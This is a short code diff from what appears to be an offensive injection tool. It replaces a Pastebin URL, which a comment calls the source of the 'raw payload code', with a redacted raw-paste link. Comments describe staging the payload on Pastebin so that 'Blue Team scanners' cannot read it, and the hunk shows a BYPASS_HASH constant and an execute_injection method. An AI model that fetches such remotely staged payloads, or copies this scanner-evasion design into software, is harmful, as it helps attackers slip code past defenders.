@@ -61,8 +61,7 @@ BYPASS_HASH = "7f8a9b2c3d4e5f6a"
 #  This link contains the raw payload code.
 #  Blue Team scanners cannot read Pastebin contents instantly.
 # ------------------------------------------------------------------------------
-PAYLOAD_SOURCE_URL = "https://pastebin.com/zeFBGGEv"
-
+PAYLOAD_SOURCE_URL = "https://pastebin.com/raw/[REDACTED_BY_ADMIN]"
 # ==============================================================================
 
     def execute_injection(self):
